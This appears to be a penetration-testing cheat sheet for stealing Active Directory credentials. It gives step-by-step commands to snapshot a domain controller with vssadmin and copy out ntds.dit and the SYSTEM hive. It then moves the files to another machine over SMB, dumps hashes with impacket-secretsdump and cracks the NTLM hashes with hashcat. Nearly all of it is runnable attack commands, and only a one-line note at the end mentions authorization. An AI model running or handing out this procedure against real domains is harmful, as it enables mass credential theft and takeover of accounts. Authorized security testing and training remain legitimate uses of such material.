**Overview**

The Active Directory database NTDS.DIT contains user password hashes for domain accounts.

## Locating NTDS.DIT and Required SYSTEM Hive

- Default location: `%systemroot%\\NTDS\\ntds.dit`

## Using Volume Shadow Copy Service to Create Snapshot and Access Files

- **List existing Volume Shadow Copies on the machine.**
    
    ```
    vssadmin List Shadows
    
    ```
    
- **Create a new Shadow Copy for the C: drive to access locked files.**
    
    ```
    vssadmin create shadow /FOR=C:
    
    ```
    
- **Verify that the shadow copy has been created.**
    
    ```
    vssadmin List Shadows
    
    ```
    
- **Create a directory to store the dumped registry hives.**
    
    ```
    mkdir c:\\dumped-hives
    
    ```
    
- **Copy the NTDS.DIT file from the shadow copy to a local folder.**
    
    ```
    copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit c:\\dumped-hives\\ntds.dit
    
    ```
    
- **Copy the SYSTEM hive from shadow copy, required for decryption.**
    
    ```
    copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM c:\\dumped-hives\\system
    
    ```
    
- **Optional: Check the shadow copies again.**
    
    ```
    vssadmin List Shadows
    
    ```
    

## Download Dumped Files via SMB

- **Connect to remote share to download dump files.**
    
    ```
    smbclient //192.168.1.52/dumped-hives -U administrator
    
    ```
    
- **Download the NTDS.DIT and SYSTEM hive files.**
    
    ```
    mget ntds.dit system
    
    ```
    

## Extracting Hashes Using impacket-secretsdump

- **Dump hashes from the Active Directory database using local copies.**
    
    ```
    impacket-secretsdump -system system -ntds ntds.dit LOCAL
    
    ```
    
- **Output results to a file named ad_armour.**
    
    ```
    impacket-secretsdump -system system -ntds ntds.dit LOCAL -outputfile ad_armour
    
    ```
    

## Extract NTLM Hashes from Output for Cracking

- **Extract NTLM hashes from secretsdump output.**
    
    ```
    cat ad_armour.ntds | cut -d: -f 4 | sort | uniq > ad_hashes.txt
    
    ```
    

## Cracking Active Directory Hashes with hashcat

- **Crack hashes with rockyou.txt and show cracked passwords.**
    
    ```
    hashcat -m 1000 -a 0 ad_armour.ntds /usr/share/wordlists/rockyou.txt --show
    
    ```
    
- **Crack with username output formatting, save session and results.**
    
    ```
    hashcat -m 1000 -a 0 --session=all --username --outfile-format=2 ad_armour.ntds /opt/password.txt
    
    ```
    
- **Show cracked passwords with a different output format.**
    
    ```
    hashcat -m 1000 -a 0 --session=all --username --outfile-format=1 ad_armour.ntds /opt/password.txt --show
    
    ```
    
- **Show cracked results with session control and formatting.**
    
    ```
    hashcat -m 1000 -a 0 --session=all --username --outfile-format=2 ad_armour.ntds /opt/password.txt --show
    
    ```
    
- **Crack specified NTLM hashes and output passwords to a file.**
    
    ```
    hashcat -m 1000 -a 0 ntlm-hash.txt -o ntlm-hash-password.txt /opt/passwords.txt
    
    ```
    

## Notes

- Use impacket-secretsdump for both SAM and NTDS.DIT extraction.
- hashcat -m 1000 is used for cracking NTLM hashes.
- Volume Shadow Copy (vssadmin) is useful to access locked system files.
- SMB protocol can be used to transfer dump files from remote hosts.
- Always perform these actions ethically and with proper authorization.
